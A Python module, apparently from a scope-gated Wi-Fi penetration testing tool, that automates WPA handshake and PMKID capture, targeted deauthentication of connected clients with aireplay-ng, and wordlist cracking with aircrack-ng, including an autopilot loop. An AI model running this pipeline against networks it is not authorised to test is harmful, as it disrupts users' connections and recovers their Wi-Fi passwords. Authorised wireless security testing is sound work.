"""Background capture + crack jobs, keyed by target BSSID. Every job re-checks
the scope gate before running a single command.
"""
from __future__ import annotations
import glob
import os
import re
import subprocess
import threading
import time
from dataclasses import dataclass, field, asdict
from .scope import Scope

_KEY_RE = re.compile(r"KEY FOUND!\s*\[\s*(.*?)\s*\]")
_PROG_RE = re.compile(r"(\d+)\s*/\s*(\d+)\s+keys tested.*?([\d.]+)\s*k/s", re.I)
_HS_RE = re.compile(r"\b(\d+)\s+handshake", re.I)


@dataclass
class Job:
    bssid: str
    kind: str                       # "capture" | "crack"
    status: str = "idle"            # idle|running|handshake|done|failed
    handshake: bool = False
    password: str | None = None
    message: str = ""
    cap_file: str | None = None
    started: float = field(default_factory=time.time)
    tested: int = 0
    total: int = 0
    rate: float = 0.0          # keys/sec
    eta: int = 0               # seconds remaining
    progress: float = 0.0      # 0..1

    def dict(self):
        return asdict(self)


class JobManager:
    def __init__(self, scope: Scope, iface: str, out_dir: str = "captures",
                 scanner=None):
        self.scope = scope
        self.iface = iface
        self.out_dir = out_dir
        self.scanner = scanner
        self.jobs: dict[str, Job] = {}      # keyed "bssid:kind"
        self._procs: dict[str, subprocess.Popen] = {}
        self._lock = threading.Lock()
        self.auto = False
        self.auto_deauth = False
        self.wordlist = None
        self._auto_thread = None

    # ---- capture -------------------------------------------------------
    def start_capture(self, bssid: str, channel: str, deauth: bool) -> Job:
        self.scope.require(bssid)                       # hard gate
        key = f"{bssid}:capture"
        job = Job(bssid=bssid, kind="capture", status="running",
                  message="capturing…")
        self.jobs[key] = job
        threading.Thread(target=self._capture, args=(job, channel, deauth),
                         daemon=True).start()
        return job

    def _capture(self, job: Job, channel: str, deauth: bool):
        # one radio: pause the channel-hopping scanner so the capture stays
        # locked on the target channel (otherwise the handshake is missed)
        scanner_was_running = bool(self.scanner and self.scanner.running)
        clients = []
        if self.scanner:
            try:
                clients = [c["mac"] for c in self.scanner.read().get("clients", [])
                           if c.get("bssid", "").upper() == job.bssid.upper()
                           and ":" in c.get("mac", "")]
            except Exception:
                pass
        if scanner_was_running:
            self.scanner.stop()
        if channel:
            subprocess.run(["iw", "dev", self.iface, "set", "channel", channel],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        d = os.path.join(self.out_dir, job.bssid.replace(":", ""))
        os.makedirs(d, exist_ok=True)
        prefix = os.path.join(d, "cap")
        cmd = ["airodump-ng", "--bssid", job.bssid, "-c", channel,
               "-w", prefix, "--output-format", "pcap", self.iface]
        inject_note = ""
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL)
            self._procs[f"{job.bssid}:capture"] = proc
            time.sleep(3)
            deadline = time.time() + 240
            round_no = 0
            while time.time() < deadline and proc.poll() is None:
                # targeted deauth each round (to the associated client if known —
                # far more effective than a broadcast, when the card can inject)
                if deauth:
                    inject_note = self._deauth(job.bssid, clients)
                time.sleep(5)
                cap = self._latest_cap(d)
                if cap:
                    n = self._eapol_count(cap, job.bssid)
                    pmkid = self._has_pmkid(cap)
                    seen = len(clients)
                    base = f"fanger… EAPOL: {n}/4"
                    if pmkid:
                        base += " · PMKID ✓"
                    if seen == 0:
                        base += " · ingen klient sett — koble telefonen til nettet"
                    if inject_note:
                        base += f" · {inject_note}"
                    job.message = base
                    if self._has_handshake(cap, job.bssid) or pmkid:
                        job.handshake = True
                        job.cap_file = cap
                        job.status = "handshake"
                        job.message = ("PMKID fanget" if pmkid else "håndtrykk fanget") + \
                                      f" (EAPOL {n}/4)"
                        break
                round_no += 1
            if not job.handshake:
                job.status = "done"
                why = "ingen håndtrykk"
                if not clients:
                    why += " — ingen enhet koblet til nettet mens vi fanget"
                elif inject_note and "injection" in inject_note.lower():
                    why += " — deauth injiseres ikke på dette kortet (MT7921-begrensning); prøv passiv fangst eller USB-adapter"
                job.message = "stoppet: " + why
        except Exception as e:
            job.status = "failed"; job.message = str(e)
        finally:
            self._stop_proc(f"{job.bssid}:capture")
            if scanner_was_running and self.scanner and not self.scanner.running:
                self.scanner.start()

    def _deauth(self, bssid: str, clients: list[str]) -> str:
        """Targeted deauth to each known client (broadcast if none). Returns a
        short note if injection appears to be failing (common on mt76 cards)."""
        note = ""
        targets = clients or [None]
        for cmac in targets:
            cmd = ["aireplay-ng", "--deauth", "5", "-a", bssid]
            if cmac:
                cmd += ["-c", cmac]
            cmd += [self.iface]
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
                out = (r.stdout + r.stderr).lower()
                if ("injection is not supported" in out or
                        "couldn't inject" in out or "no such" in out):
                    note = "deauth: injection feiler"
            except Exception:
                note = "deauth: feilet"
        return note

    @staticmethod
    def _has_pmkid(cap: str) -> bool:
        """PMKID present? Use hcxpcapngtool if available (most reliable)."""
        try:
            import shutil, tempfile, os as _os
            if not shutil.which("hcxpcapngtool"):
                return False
            out = tempfile.mktemp(suffix=".22000")
            subprocess.run(["hcxpcapngtool", "-o", out, cap],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           timeout=30)
            has = _os.path.exists(out) and _os.path.getsize(out) > 0
            if _os.path.exists(out):
                _os.remove(out)
            return has
        except Exception:
            return False

    def stop_capture(self, bssid: str):
        self._stop_proc(f"{bssid}:capture")
        j = self.jobs.get(f"{bssid}:capture")
        if j and j.status == "running":
            j.status = "done"; j.message = "stopped by user"

    # ---- crack ---------------------------------------------------------
    def start_crack(self, bssid: str, wordlist: str) -> Job:
        self.scope.require(bssid)                       # hard gate
        cap = self.jobs.get(f"{bssid}:capture")
        cap_file = cap.cap_file if cap else None
        if not cap_file:
            cap_file = self._latest_cap(
                os.path.join(self.out_dir, bssid.replace(":", "")))
        key = f"{bssid}:crack"
        job = Job(bssid=bssid, kind="crack", status="running",
                  cap_file=cap_file, message="cracking…")
        self.jobs[key] = job
        if not cap_file or not os.path.exists(cap_file):
            job.status = "failed"; job.message = "no capture file yet"
            return job
        if not os.path.exists(wordlist):
            job.status = "failed"; job.message = f"wordlist not found: {wordlist}"
            return job
        try:
            with open(wordlist, "rb") as fh:
                job.total = sum(1 for _ in fh)
        except Exception:
            job.total = 0
        threading.Thread(target=self._crack, args=(job, wordlist),
                         daemon=True).start()
        return job

    def _crack(self, job: Job, wordlist: str):
        cmd = ["aircrack-ng", "-b", job.bssid, "-w", wordlist, job.cap_file]
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT, text=True, bufsize=1)
            self._procs[f"{job.bssid}:crack"] = proc
            buf = ""
            for line in proc.stdout:          # universal newlines split \r updates too
                m = _PROG_RE.search(line)
                if m:
                    job.tested = int(m.group(1))
                    rep_total = int(m.group(2))
                    job.rate = float(m.group(3)) * 1000.0
                    job.total = job.total or rep_total
                    if job.total:
                        job.progress = min(job.tested / job.total, 0.999)
                        if job.rate > 0:
                            job.eta = int((job.total - job.tested) / job.rate)
                    job.message = "cracker…"
                k = _KEY_RE.search(line)
                if k:
                    job.password = k.group(1)
                buf = line
            proc.wait()
            if job.password:
                job.status = "done"; job.progress = 1.0; job.eta = 0
                job.message = "passord funnet"
                try:
                    import os as _os
                    _os.makedirs(".run", exist_ok=True)
                    open(".run/step1_done", "w").write(job.bssid + "\n")
                except Exception:
                    pass
            else:
                job.status = "done"; job.message = "ikke funnet i ordlista"
        except Exception as e:
            job.status = "failed"; job.message = str(e)
        finally:
            self._stop_proc(f"{job.bssid}:crack")

    # ---- helpers -------------------------------------------------------
    @staticmethod
    def _latest_cap(d: str) -> str | None:
        caps = sorted(glob.glob(os.path.join(d, "*.cap")),
                      key=os.path.getmtime, reverse=True)
        return caps[0] if caps else None

    @staticmethod
    def _eapol_count(cap: str, bssid: str) -> int:
        """Count EAPOL (4-way handshake) frames for this AP via tshark."""
        try:
            out = subprocess.run(
                ["tshark", "-r", cap, "-Y",
                 f"eapol && wlan.addr == {bssid}", "-T", "fields",
                 "-e", "frame.number"],
                capture_output=True, text=True, timeout=30).stdout
            return len([x for x in out.splitlines() if x.strip()])
        except Exception:
            return 0

    @staticmethod
    def _has_handshake(cap: str, bssid: str) -> bool:
        if JobManager._eapol_count(cap, bssid) >= 4:
            return True
        try:
            out = subprocess.run(["aircrack-ng", cap], capture_output=True,
                                 text=True, timeout=30).stdout
        except Exception:
            return False
        for line in out.splitlines():
            if bssid.upper() in line.upper():
                m = _HS_RE.search(line)
                if m and int(m.group(1)) > 0:
                    return True
        return "1 handshake" in out

    def _stop_proc(self, key: str):
        p = self._procs.pop(key, None)
        if p and p.poll() is None:
            p.terminate()
            try:
                p.wait(timeout=5)
            except Exception:
                p.kill()

    # ---- autopilot: capture + crack every authorised target on its own ------
    def set_auto(self, on: bool, deauth: bool = False, wordlist: str | None = None):
        self.auto_deauth = bool(deauth)
        self.wordlist = wordlist
        if on and not self.auto:
            self.auto = True
            self._auto_thread = threading.Thread(target=self._autopilot, daemon=True)
            self._auto_thread.start()
        elif not on:
            self.auto = False

    def _autopilot(self):
        while self.auto:
            for t in self.scope.all():               # only authorised targets
                b = t.bssid
                cap = self.jobs.get(f"{b}:capture")
                crk = self.jobs.get(f"{b}:crack")
                if crk and (crk.password or crk.status == "running"):
                    continue
                if not cap or cap.status not in ("running", "handshake"):
                    try:
                        self.start_capture(b, "", self.auto_deauth)
                    except Exception:
                        pass
                elif cap.handshake and not crk:
                    try:
                        self.start_crack(b, self.wordlist or
                                         "/usr/share/wordlists/rockyou.txt")
                    except Exception:
                        pass
            time.sleep(10)

    def snapshot(self) -> dict:
        return {k: j.dict() for k, j in self.jobs.items()}
